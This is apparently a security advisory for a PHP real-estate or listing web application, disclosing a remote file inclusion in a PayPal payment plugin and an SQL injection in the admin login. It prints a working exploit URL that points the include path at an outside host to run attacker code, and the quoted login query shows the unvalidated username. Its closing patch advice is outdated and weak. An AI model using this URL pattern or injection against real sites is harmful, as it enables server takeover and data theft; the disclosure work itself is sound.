   Details:

	1) /include/paymentplugins/payment_paypal.php

	   /**
	   Paypal payment plugin
	   */
	  global $config,$conn;
	  include("$config[basepath]/include/payment/class.paypal_ipn.php");
	  include("$config[basepath]/include/paymentplugins/paymentplugin.php");

	   
	  If register_globals is set on, we can include and execute any php code of our choice. This is very dangerous
	  because if safe_mode is off and there are no restriction for execution commands an attacker can get access
	  to each file on the server.

	  http://www.example.com/include/paymentplugins/payment_paypal.php?config[basepath]=http://youhost.com/our-code.txt?

	  Because of the trailing '?' we pass the '/include/payment/class.paypal_ipn.php' from the include statement as a parameter
	  to the our-code.php script so only the script we set in $config[basepath] is included.

	2) /admin/index.php

	  $sql_user_name = $user_name;
	  $md5_pass = md5($user_pass);
						
	  $sql = "SELECT * FROM UserDB WHERE user_name='$sql_user_name' and user_password='$md5_pass'";

	  The User submitted variable for the username is inserted into the database without andy validation. Because of this
	  we can insert malicious code into the database.

	Nearly NO user-submitted variable is validated , so there are a few more SQL-injections possible. 
 
	   
	   
   Patch:
          Insert constants and use the following code to prevent against such attacks

	  if( !defined('IN_SYS') ) {
		die('Hacking Attempt!');
	  }

	  and activate magic_quotes_gpc
